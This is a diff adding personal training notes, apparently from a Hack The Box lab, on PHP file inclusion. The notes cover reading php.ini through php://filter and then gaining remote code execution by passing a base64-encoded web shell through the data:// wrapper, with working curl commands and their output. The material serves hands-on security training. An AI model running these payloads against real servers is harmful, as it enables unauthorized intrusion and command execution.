@@ -539,3 +539,74 @@ $API_KEY = "Awew242GDshrf46+35/k";
 - If `configure` is PHP code, it will run it — so you won’t see the source.
 
 so we need to convert the result to php to process and show in encode format
+
+
+### PHP wrappers
+
+Data Wrapper
+- used to include external data, including PHP code.
+-  data://text/plain;base64, (usage)
+- only availble to use if allow_url_include is enabled in PHP configurations
+
+we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini
+
+for Apache or at (`/etc/php/X.Y/fpm/php.ini`)
+
+for Nginx, where `X.Y` is your install PHP version
+
+We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file.
+
+We will also use the `base64` filter we used in the previous section, as `.ini` files are similar to `.php` files
+should be encoded to avoid breaking.
+
+we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it:
+
+```
+shell-session
+perplex007@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+<!DOCTYPE html>
+
+<html lang="en">
+...SNIP...
+ <h2>Containers</h2>
+    W1BIUF0KCjs7Ozs7Ozs7O
+    ...SNIP...
+    4KO2ZmaS5wcmVsb2FkPQo=
+<p class="read-more">
+```
+
+Once we have the base64 encoded string, we can decode it and `grep` for `allow_url_include` to see its value:
+
+```shell-session
+echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+
+allow_url_include = On
+```
+
+xcellent! We see that we have this option enabled, so we can use the `data` wrapper.
+
+- Knowing how to check for the `allow_url_include` option can be very important, as `this option is not enabled by default`
+- It is not uncommon to see this option enabled, as many web applications rely on it to function properly, like some WordPress plugins and themes, for example.
+#### Remote Code Execution
+- we can proceed with our `data` wrapper attack. As mentioned earlier, the `data` wrapper can be used to include external data
+- We can also pass it `base64` encoded strings with `text/plain;base64`, and it has the ability to decode them and execute the PHP code.
+
+```shell-session
+perplex007@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64
+
+PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+```
+
+
+we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64`
+
+we can use pass commands to the web shell with `&cmd=<COMMAND>`:
+
+![[Pasted image 20250812212830.png]]
+
+```shell-session
+perplex007@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
+            uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+
